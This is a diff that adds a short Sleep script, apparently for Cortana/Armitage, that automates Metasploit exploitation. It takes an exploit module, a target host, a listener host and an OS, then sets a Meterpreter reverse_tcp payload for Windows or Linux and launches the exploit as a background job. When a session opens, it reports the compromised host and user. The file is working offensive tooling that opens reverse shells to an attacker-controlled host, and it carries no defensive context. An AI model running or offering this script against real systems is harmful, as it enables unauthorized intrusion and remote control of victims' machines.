@@ -1,0 +1,40 @@
+debug (7 | 24)
+
+on ready {
+
+}
+
+command cmdline_arg {
+   local('$console $attack $payload');
+   $console = console();
+   
+   $attack = "exploit/" . $1;
+
+   $payload = determinePayload($4);
+   println("$payload");
+
+   cmd($console, "use $attack");
+   cmd($console, "set rhost $2");
+   cmd($console, "set lhost $3");
+   cmd($console, "set payload $payload");
+   cmd($console, "exploit -j");
+}
+
+sub determinePayload {
+   if ($1 == "windows") {
+	return "windows/meterpreter/reverse_tcp";
+   }
+   return "linux/x86/meterpreter/reverse_tcp";
+}
+
+on session_open {
+   local('$flag $host $user $sessionNum $session');
+   $session = $2;
+   println("Session open: $1 $2");
+   println("$session['host'], $session['user']");
+   quit();
+}
+
+on console_exploit {
+   println("Exploit: $1 $2 $3");
+}
